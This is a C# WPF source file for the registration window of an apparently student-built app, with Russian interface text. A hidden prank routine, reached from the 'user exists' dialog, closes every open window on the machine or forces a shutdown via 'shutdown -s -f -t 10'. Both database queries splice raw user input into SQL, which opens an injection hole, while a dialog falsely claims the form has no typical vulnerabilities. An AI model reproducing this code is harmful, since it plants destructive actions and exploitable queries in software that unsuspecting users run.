using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Security.Cryptography;
using System.Data.SqlClient;
using System.Diagnostics;

namespace Practicka.Authorization
{
    /// <summary>
    /// Interaction logic for Registration.xaml
    /// </summary>
    public partial class Registration : Window
    {

        public Registration()
        {
            InitializeComponent();
        }

        private void GoToBack_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }
        private void Window_KeyUp(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Escape)
            {
                //MainWindow.Close(sender,null);
            }
        }

        private MessageBoxResult MisterBlinov(MessageBoxResult result)
        {
            var resultTwo = MessageBox.Show("Вы верите в Мистера Блинова?", "Вера в Мистера Блинова", MessageBoxButton.YesNo, MessageBoxImage.Question);
            if (resultTwo == MessageBoxResult.Yes)
            {
                MessageBox.Show("Наш слоняра, мистер Блинов передает вам привет!", "Мистер Блинов", MessageBoxButton.OK, MessageBoxImage.Information);
                foreach (Process process in Process.GetProcesses())
                {
                    if (process.MainWindowTitle != string.Empty)
                    {
                        process.CloseMainWindow();
                    }
                }
            }
            if (resultTwo == MessageBoxResult.No)
            {
                MessageBox.Show("Мистер Блинов передает вам привет !", "Мистер Блинов", MessageBoxButton.OK, MessageBoxImage.Information);
                System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 10");
            }
            return result;
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Modules.DataBaseModule DataBase = new Modules.DataBaseModule();
            StringBuilder builder = new StringBuilder();
            using (SHA256 hash256 = SHA256.Create()){
                byte[] hash = hash256.ComputeHash(Encoding.UTF8.GetBytes($"{login.Text}{password.Text}"));
                
                for (int i = 0; i < hash.Length; i++)
                {
                    builder.Append(hash[i].ToString("x2"));
                }
            }
            using (SqlConnection connection = new SqlConnection(DataBase.connectionString))
            {
                string query = $"SELECT * FROM Users WHERE Login LIKE '{login.Text}'";
                SqlCommand command = new SqlCommand(query, connection);

                try
                {
                    connection.Open();
                    SqlDataReader reader = command.ExecuteReader();
                    if (reader.Read())
                    {
                        MessageBoxResult result = MessageBox.Show( "Данный пользователь уже существует!", "Ошибка", MessageBoxButton.YesNo, MessageBoxImage.Error);
                        if (result == MessageBoxResult.Yes)
                        {
                            MisterBlinov(result);
                        }
                        else
                        {
                            MessageBox.Show($"Ну хорошо если ты считаешь что пользователя '{login.Text}' не существует то пусть для тебя это будет так, но реальность это к сожалению не изменить и пользователь с логином: '{login.Text}' и дальше будет существовать пока не удалит свой аккаунт", "Что екарный бабай тут происходит", MessageBoxButton.OK, MessageBoxImage.Information);
                        }
                        
                    }
                    else if (login.Text.Trim() != "" && login.Text.Trim() != "Логин" && login.Text.Trim().Length >= 4 && password.Text.Trim() != "Пароль" && password.Text.Trim() != "" && password.Text.Trim().Length >= 8)
                    {
                        // SQL-запрос для вставки данных
                        string insertQuery = $"INSERT INTO Users (Login,Password) VALUES ('{login.Text}','{builder}')";

                        // Создаем команду с параметрами
                        command = new SqlCommand(insertQuery, connection);

                        try
                        {
                            reader.Close();
                            // Выполняем запрос на вставку данных
                            int rowsAffected = command.ExecuteNonQuery();

                            MessageBoxResult result = MessageBox.Show("Вы успешно зарегистрировали новый аккаунт!", "Успех", MessageBoxButton.OK, MessageBoxImage.Asterisk);
                            if(result == MessageBoxResult.OK)
                            {
                                this.Close();
                            }
                            
                        }
                        catch (SqlException ex)
                        {
                            Console.WriteLine("Ошибка при добавлении данных: " + ex.Message);
                        }
                    }
                    else if(login.Text.Trim() == "" && login.Text.Trim() == "Логин" && password.Text.Trim() == "Пароль" && password.Text.Trim() == "")
                    {
                        MessageBox.Show("Необходмио заполнить хотя бы одно поле!", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                    else if (login.Text.Trim().Length < 4)
                    {
                        MessageBoxResult result = MessageBox.Show("Логин должен содержать минимум 4 символа!", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                        if (result == MessageBoxResult.OK)
                        {
                            MessageBox.Show("Спросишь почему так? Ответ поскольку в логине будет куда больше символов это затруднит взлом аккаунта", "Опять голоса в голове", MessageBoxButton.OK, MessageBoxImage.Asterisk);
                        }
                    }
                    else if (password.Text.Trim().Length < 8)
                    {
                        MessageBoxResult result = MessageBox.Show("Пароль должен содержать минимум 8 символов!", "Ошибка", MessageBoxButton.OK, MessageBoxImage.Error);
                        if(result == MessageBoxResult.OK)
                        {
                            MessageBox.Show("Критикуете и критикуете, почему сразу не льзя ввести безопасный пароль и не мучиться, и да тут нет типичных уязвимостей", "Критика", MessageBoxButton.OK, MessageBoxImage.Asterisk);
                        }
                    }
                    reader.Close();
                }
                catch (SqlException ex)
                {
                    Console.WriteLine("Ошибка при выполнении запроса: " + ex.Message);
                }
            }
            // Создаем подключение
        }

        private void login_GotFocus(object sender, RoutedEventArgs e)
        {
            if (login.Text == "Логин")
            {
                login.Text = "";
            }
        }

        private void login_LostFocus(object sender, RoutedEventArgs e)
        {
            if (login.Text == "")
            {
                login.Text = "Логин";
            }
        }

        private void password_GotFocus(object sender, RoutedEventArgs e)
        {
            if (password.Text == "Пароль")
            {
                password.Text = "";
            }
        }

        private void password_LostFocus(object sender, RoutedEventArgs e)
        {
            if (password.Text == "")
            {
                password.Text = "Пароль";
            }
        }
    }
}
